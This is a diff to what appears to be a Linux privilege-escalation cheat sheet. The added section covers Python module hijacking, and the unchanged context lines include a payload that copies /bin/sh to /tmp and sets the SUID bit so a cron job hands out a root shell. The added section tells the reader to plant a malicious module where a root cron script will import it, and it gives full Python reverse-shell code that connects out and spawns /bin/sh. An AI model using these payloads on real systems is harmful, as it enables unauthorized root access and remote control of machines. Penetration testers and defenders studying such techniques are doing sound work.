@@ -226,6 +226,27 @@ default /usr/bin:/bin
     import os    
     os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")   
     #post cronjob run: /tmp/sh -p      
+### Privilege Escalation Through Python Module Hijacking   
+If if a Python script is running with elevated privileges and you can modify a directory in the Python PATH variable to inject code using a module import.         
+Enumerate Python's path     
+
+    python -c 'import sys; print(sys.path)'    
+If you can modify part of the path to override an existing module: use RootPython above or a Python reverse shell to escalate. When the con job runs, it will import the malicious module and execute code.    
+Example cron job script:    
+
+    import bad   
+    print("Normal script")    
+Create bad.py and place it in the same directory as the script, then run nc on the box to get a shell:    
+
+    import socket 
+    import subprocess 
+    import os   
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("127.0.0.1",1337)) 
+    os.dup2(s.fileno(),0) 
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p = subprocess.call(["/bin/sh","-i"])        
 ### Wildcards 
 [Exploiting wildcards in Linux](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) 
 
